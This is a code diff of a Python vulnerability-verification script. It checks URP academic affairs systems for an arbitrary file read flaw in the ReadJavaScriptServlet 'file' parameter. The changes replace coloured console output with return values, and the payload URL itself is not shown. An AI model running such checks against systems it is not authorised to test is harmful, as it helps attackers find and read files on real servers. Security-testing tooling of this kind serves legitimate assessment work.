@@ -8,8 +8,8 @@ description: 文件com.runqian.base.util.ReadJavaScriptServlet中,参数file存�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class urp_ReadJavaScriptServlet_fileread_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class urp_ReadJavaScriptServlet_fileread_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在URP综合教务系统任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在URP综合教务系统任意文件读取漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = urp_ReadJavaScriptServlet_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
